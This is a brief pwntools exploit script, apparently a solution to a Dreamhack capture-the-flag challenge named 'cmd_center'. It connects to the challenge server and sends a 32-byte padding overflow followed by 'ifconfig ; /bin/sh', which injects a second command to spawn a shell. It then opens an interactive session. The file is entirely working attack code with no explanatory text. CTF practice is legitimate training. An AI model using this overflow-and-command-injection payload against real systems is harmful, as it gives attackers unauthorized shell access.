#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./cmd_center',checksec=False)

r = remote('host3.dreamhack.games',8621)
# r = process(exe.path)
# input()
payload = b'A'*0x20 + b'ifconfig ; /bin/sh'

r.sendafter(b"Center name: ",payload)

r.interactive()